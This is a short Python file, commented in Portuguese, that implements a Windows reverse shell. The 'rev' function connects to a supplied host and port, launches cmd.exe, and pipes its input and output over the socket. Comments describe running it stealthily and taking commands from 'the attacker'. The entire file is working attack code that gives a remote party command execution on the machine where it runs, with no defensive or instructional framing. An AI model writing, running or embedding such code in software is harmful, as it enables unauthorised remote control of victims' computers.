import socket
import subprocess
import threading

def rev(host, port):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # inicia o cmd.exe sem janela (stealth)
    p = subprocess.Popen(
        ["cmd.exe"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=False,
        shell=False
    )

    # função para enviar output do cmd.exe para o socket
    def read_from_process(stream):
        while True:
            data = stream.read(1)
            if not data:
                break
            s.send(data)

    # threads para stdout/stderr
    threading.Thread(target=read_from_process, args=(p.stdout,), daemon=True).start()
    threading.Thread(target=read_from_process, args=(p.stderr,), daemon=True).start()

    # receber comandos do atacante e enviar ao processo
    try:
        while True:
            cmd = s.recv(1024)
            if not cmd:
                break
            p.stdin.write(cmd)
            p.stdin.flush()
    except:
        pass

    p.kill()
    s.close()
